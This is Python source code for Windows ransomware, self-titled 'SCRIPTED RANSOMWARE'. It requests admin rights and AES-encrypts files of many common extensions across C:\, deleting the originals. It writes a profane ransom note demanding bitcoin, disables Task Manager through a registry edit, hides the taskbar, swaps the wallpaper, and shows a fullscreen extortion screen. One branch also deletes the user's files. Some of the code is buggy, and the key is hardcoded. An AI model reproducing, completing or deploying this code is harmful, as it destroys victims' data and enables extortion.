import ctypes
import datetime
import os
import random
import struct
import subprocess
import tkMessageBox
import urllib
from Tkinter import *
from ctypes import wintypes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import tst
id = os.getenv('username')





amount = "0011111109202"
btc = "89ikwmkdio9ew2ii8h7t80j0898cd86978hnj"
url = ""
strongkey = "12345"
contact = "schlot"










if not tst.isUserAdmin():
    tst.runAsAdmin()
def encrypt(key, filename):
    chunk_size = 64 * 1024
    output_file = filename + ".impect"
    file_size = str(os.path.getsize(filename)).zfill(16)
    IV = ''
    for i in range(16):
        IV += chr(random.randint(0, 0xFF))
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    with open(filename, 'rb') as inputfile:
        with open(output_file, 'wb') as outf:
            outf.write(file_size)
            outf.write(IV)
            while True:
                chunk = inputfile.read(chunk_size)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                outf.write(encryptor.encrypt(chunk))


def decrypt(key, filename):
    chunk_size = 64 * 1024
    output_file = filename[:-3]
    with open(filename, 'rb') as inf:
        filesize = long(inf.read(16))
        IV = inf.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, IV)
        with open(output_file, 'wb') as outf:
            while True:
                chunk = inf.read(chunk_size)
                if len(chunk) == 0:
                    break
                outf.write(decryptor.decrypt(chunk))
            outf.truncate(filesize)


def getKey(password):
    hasher = SHA256.new(password)
    return hasher.digest()


def main(password):
    extension = [".jpg", ".jpeg", ".raw", ".tif", ".gif", ".png", ".bmp", ".3dm", ".max", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg", ".dxf", ".c", ".cpp", ".cs", ".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl", ".indt", ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps", ".ps", ".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx", ".docm", ".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt", ".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb", ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm", ".wav", ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa.wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx", ".flv", ".mpg", ".wmv", ".vob", ".m3u8", ".mkv", ".dat", ".csv", ".efx", ".sdf", ".vcf", ".xml", ".ses", ".rar", ".zip", ".7zip", ".jpg", ".jpeg", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"]
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            for i in extension:
                    if file.endswith(i):
                        try:
                            path = (os.path.join(root, file))
                            encrypt(getKey(password), path)
                            os.remove(path)
                            f = open("C:\\Users\\" + id + "\\Desktop\\how to get back you files.txt", "w+")
                            f.write(
                                    "Attention MOTHERFUCKER!\n\nAll your main files were encrypted!\n\nYour personal files (documents, databases, jpeg, docx, doc,\netc.) were encrypted, their further using impossible.\nTO DECRYPT YOUR FILES YOU NEED TO BUY A SOFTWARE WITH YOUR UNIQUE PRIVATE KEY. ONLY OUR\nSOFTWARE WILL ALLOW YOU DECRYPT YOUR FILES.\nNOTE:\nYou have only 6 hours from the moment when an encryption was done to buy our software at $" + amount + ", in bitcoin \nYou all files will get deleted after the lapse of 6 hours.\nAny attempts to remove this encryption will be unsuccessful. You cannot do this without our software with your key.\nDo not send any emails with threats and rudeness to us. Example of email format: Hi, I need a decryption of my files.\n\nBitcoin address = " + btc + "\n\nContact us by email only: "+contact+"\n ")
                            f.close()
                        except:
                            pass


user32 = ctypes.WinDLL("user32")

SW_HIDE = 0
SW_SHOW = 5

HIDE = True

user32.FindWindowW.restype = wintypes.HWND
user32.FindWindowW.argtypes = (
    wintypes.LPCWSTR,
    wintypes.LPCWSTR)

user32.ShowWindow.argtypes = (
    wintypes.HWND,
    ctypes.c_int)

def hide_taskbar():
    hWnd = user32.FindWindowW(u"Shell_traywnd", None)
    user32.ShowWindow(hWnd, SW_HIDE)

    hWnd_btn_start = user32.FindWindowW(u"Button", 'Start')
    user32.ShowWindow(hWnd_btn_start, SW_HIDE)



urllib.urlretrieve(url, "C:\\Users\\" + id + "\\AppData\\Local\\1.jpg")
def change():
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "C:\\Users\\" + id + "\\AppData\\Local\\1.jpg", 0)

def is_64_windows():
    return struct.calcsize('P') * 8 == 64


def get_sys_parameters_info():
    return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
        else ctypes.windll.user32.SystemParametersInfoA


def change_wallpaper():
    SPI_SETDESKWALLPAPER = 20
    sys_parameters_info = get_sys_parameters_info()
    r = sys_parameters_info(SPI_SETDESKWALLPAPER , 0, "C:\\Users\\" + id + "\\AppData\\Local\\1.jpg", 3)
    if not r:
        print(ctypes.WinError())


def disabletask():
    f = open("C:\\Users\\"+id+"\\AppData\\Local\\run.bat", "w+")
    f.write("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /f /v DisableTaskMgr /t REG_DWORD /d 00000001")
    f.close()
    subprocess.Popen("C:\\Users\\"+id+"\\AppData\\Local\\run.bat", creationflags=subprocess.SW_HIDE,shell=True)


def checknum():
    try:
        disabletask()
    except:
        pass
    result = os.system("WMIC BIOS GET SERIALNUMBER")
    subprocess.Popen("cls", creationflags=subprocess.SW_HIDE,shell=True)
    subprocess.Popen("echo Dear Coustmer your software is activated you will get conformation through email soon", creationflags=subprocess.SW_HIDE,shell=True)
    return result


def checkvm():
    test = int(checknum())
    if "0" == test:
        sys.exit()
    else:
        main(strongkey)
        try:
            f = open("C:\\Users\\"+id+"\\AppData\\Local\\fix.txt", "r")
            match = str(f.read())
            check = str(match + 6)
            if match == check:
                for root, dirs, files in os.walk("C:\\Users\\"+id):
                    for file in files:
                        os.remove(file)
        except:
            f = open("C:\\Users\\"+id+"\\AppData\\Local\\fix.txt", "w+")
            currentDT = datetime.datetime.now()
            hell = str(currentDT.strftime("%H:%M:%S"))
            hepp = hell[:-6]
            f.write(hepp)
            f.close()
    hide_taskbar()
    try:
        change()
    except:
        change_wallpaper()
    gui()

def update_timeText():
    if (state):
        global timer

        timer[2] += 1

        if (timer[2] >= 100):
            timer[2] = 0
            timer[1] += 1
        if (timer[1] >= 60):
            timer[0] += 1
            timer[1] = 0
        timeString = pattern.format(timer[0], timer[1], timer[2])
        timeText.configure(text=timeString)
    master.after(10, update_timeText)
state = True

def runthefuckup():
    attck = e1.get()
    print attck
    if attck == strongkey:
        for root, dirs, files in os.walk("C:\\"):
            for file in files:
                if file.endswith(".impect"):
                    path = (os.path.join(root, file))
                    print path
                    decrypt(getKey(attck), path)
                    os.remove(path)
                    print ("run")
    else:
        tkMessageBox.showinfo("fuck", "motherfucker")

def gui():
    global timer
    global pattern
    global timeText
    global master
    global e1
    master = Tk()
    master.title("SCRIPTED RANSOMWARE")
    master.configure(bg="black")
    master.attributes("-fullscreen", True)
    master.title("SCRIPTED ransomware")
    status = Label(master,
                   text="Attention MOTHERFUCKER!\n\nAll your main files were encrypted!\n\nYour personal files (documents, databases, jpeg, docx, doc,\netc.) were encrypted, their further using impossible.\nTO DECRYPT YOUR FILES YOU NEED TO BUY A SOFTWARE WITH YOUR UNIQUE PRIVATE KEY. ONLY OUR\nSOFTWARE WILL ALLOW YOU DECRYPT YOUR FILES.\nNOTE:\nYou have only 6 hours from the moment when an encryption was done to buy our software at $" + amount + ", the payment\nYou all files will get deleted after the lapse of 6 hours.\nAny attempts to remove this encryption will be unsuccessful. You cannot do this without our software with your key.\nDo not send any emails with threats and rudeness to us. Example of email format: Hi, I need a decryption of my files.\n\nBitcoin Address : " + btc + "\n\nContact us by email only : " + contact + "\n",
                   bg="black", fg="#ee2323", font=("oemfixed", 18))
    status.grid(row=0)
    Label(master, text="Enter your Decryption key: ", bg="black", fg="#ee2323", font=("System", 15)).grid(row=2)
    e1 = Entry(master, bg="black", fg="#ee2323", font=("System", 15))
    e1.grid(row=3)
    Button(master, text='Decrypt', command=runthefuckup, bg="black", fg="#ee2323", font=("System", 15)).grid(row=4)

    timer = [0, 0, 0]
    pattern = '{0:02d}:{1:02d}:{2:02d}'
    timeText = Label(master, text="00:00:00", bg="black", fg="#ee2323", anchor=W, font=("ansi", 17))
    timeText.grid(row=1, columnspan=1, sticky=W)
    update_timeText()

    mainloop()

if __name__ == '__main__':
    checkvm()